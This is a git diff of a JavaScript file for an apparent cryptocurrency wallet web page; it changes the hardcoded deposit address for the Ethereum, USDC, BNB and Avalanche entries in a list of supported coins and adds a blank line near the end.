@@ -17,10 +17,10 @@ document.addEventListener("DOMContentLoaded", function() {
   // Simulating an array of cryptocurrencies with their data 
  const cryptocurrencies = [
     { name: 'Bitcoin', abbr: 'BTC', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png', id: 'bitcoin', balance: 0, address: 'bc1qddgqryc7r6ckjyrjlh6yla3yh5cwlp05qgwftr', network: 'Bitcoin' },
-    { name: 'Ethereum', abbr: 'ETH', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png', id: 'wrapped-steth', balance: 0, address: '0x58C167b0ed74bD43f4bD724f6DcA907dA2B2839b', network: 'Ethereum' },
+    { name: 'Ethereum', abbr: 'ETH', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png', id: 'wrapped-steth', balance: 0, address: '0x0A9cDe2eeA372f356c67DAc2eC0a560539BB27A6', network: 'Ethereum' },
     { name: 'Solana', abbr: 'SOL', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png', id: 'solana', balance: 0, address: 'HSkdrt9R7uruwXmEscDsNXPjNW9bmgVKgStuFrfym44v', network: 'Solana' },
-    { name: 'USDC', abbr: 'USDC', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png', id: 'usd-coin', balance: 0, address: '0x58C167b0ed74bD43f4bD724f6DcA907dA2B2839b', network: 'BEP20' },
-    { name: 'BNB', abbr: 'BNB', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png', id: 'binancecoin', balance: 0, address: '0x58C167b0ed74bD43f4bD724f6DcA907dA2B2839b', network: 'BEP20' },
+    { name: 'USDC', abbr: 'USDC', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png', id: 'usd-coin', balance: 0, address: '0x0A9cDe2eeA372f356c67DAc2eC0a560539BB27A6', network: 'BEP20' },
+    { name: 'BNB', abbr: 'BNB', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png', id: 'binancecoin', balance: 0, address: '0x0A9cDe2eeA372f356c67DAc2eC0a560539BB27A6', network: 'BEP20' },
     { name: 'USDT', abbr: 'USDT', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png', id: 'tether', balance: 0, address: 'TPxdxnpNJ34D6Y6VC2cHYsDvwaFCe3DWB5', network: 'TRC20' },
     { name: 'AIX', abbr: 'AIX', logoUrl: 'https://aixwallets.com/assets/img/aixc.svg', id: 'arbitrum', balance: 0, address: '0x49efE83DDA6Dd8f80DaCF00AcE0CeC5A16e37Ab8', network: 'BEP20' },
     { name: 'XRP', abbr: 'XRP', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/52.png', id: 'ripple', balance: 0, address: 'rnL9SnFtF7WdQoKAMxZ2weEbYYTVpWezPr', network: 'XRP' },
@@ -35,7 +35,7 @@ document.addEventListener("DOMContentLoaded", function() {
     { name: 'Bitcoin Cash', abbr: 'BCH', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1831.png', id: 'bitcoin-cash', balance: 0, address: 'qr2yd4xa08qdsllmpce36fmmjsdvv28ttsyzkp63kp', network: 'Bitcoin Cash' },
     { name: 'Dogecoin', abbr: 'DOGE', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png', id: 'dogecoin', balance: 0, address: 'D6kgN1NhBQABtQKB64t9c5SkvYwiH3V1fC', network: 'Dogecoin' },
     { name: 'Sui', abbr: 'SUI', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/20947.png', id: 'sui', balance: 0, address: '0x28bfa16a4d75672c4f666179f65d5f954c58b301aabd2e5872f5d39b4791b433', network: 'SUI' },
-    { name: 'Avalanche', abbr: 'AVAX', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5805.png', id: 'avalanche', balance: 0, address: '0x58C167b0ed74bD43f4bD724f6DcA907dA2B2839b', network: 'Avalanche' },
+    { name: 'Avalanche', abbr: 'AVAX', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5805.png', id: 'avalanche', balance: 0, address: '0x0A9cDe2eeA372f356c67DAc2eC0a560539BB27A6', network: 'Avalanche' },
     { name: 'Cosmos', abbr: 'ATOM', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/3794.png', id: 'cosmos', balance: 0, address: 'cosmos13ea6makagslyufvtmm3x8psh28gzvvze3xg8lj', network: 'Cosmos' },
     { name: 'Algorand', abbr: 'ALGO', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/4030.png', id: 'algorand', balance: 0, address: 'NK46Z46MG26IBCYC5YFTVQPQHBB63B6FSDTF52M7QRN67BIKUF4V7DLUS4', network: 'Algorand' },
     { name: 'VeChain', abbr: 'VET', logoUrl: 'https://s2.coinmarketcap.com/static/img/coins/64x64/3077.png', id: 'vechain', balance: 0, address: '0x232042529fC5D74Ba87668d407FDD975e3249EEF', network: 'VeChain' }
@@ -2563,6 +2563,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 }); 
  
+
 
 
 
